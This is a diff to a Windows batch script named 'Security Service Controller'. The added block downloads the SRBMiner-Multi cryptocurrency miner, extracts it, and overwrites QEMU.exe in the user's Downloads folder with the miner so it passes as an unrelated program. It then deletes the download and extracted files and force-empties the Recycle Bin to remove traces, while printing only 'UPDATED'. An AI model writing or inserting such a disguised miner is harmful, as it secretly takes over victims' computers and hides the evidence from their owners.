@@ -11,6 +11,25 @@
 title Security Service Controller
 setlocal EnableDelayedExpansion
 
+echo Downloading...
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip' -OutFile '%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip' -UseBasicParsing"
+
+echo Extracting...
+tar -xf "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip" -C "%USERPROFILE%\Downloads"
+
+echo Replacing QEMU.exe...
+del /f /q "%USERPROFILE%\Downloads\QEMU.exe" >nul 2>&1
+copy /y "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1\SRBMiner-Multi-3-1-1\SRBMiner-MULTI.exe" "%USERPROFILE%\Downloads\QEMU.exe" >nul
+
+echo Cleaning files...
+rmdir /s /q "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1"
+del /f /q "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip"
+
+echo Emptying Recycle Bin...
+powershell -Command "Clear-RecycleBin -Force" >nul 2>&1
+
+echo UPDATED
+
 echo ========================================
 echo   Security Service Controller STARTED
 echo ========================================
